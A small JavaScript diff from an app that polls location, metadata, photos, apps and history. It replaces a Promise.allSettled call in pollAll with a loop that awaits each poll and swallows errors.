@@ -395,7 +395,8 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  await Promise.allSettled([pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory()]);
+  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory()];
+  for (const fn of fns) { try { await fn; } catch {} }
 }
 
 // --- Firebase helpers ---
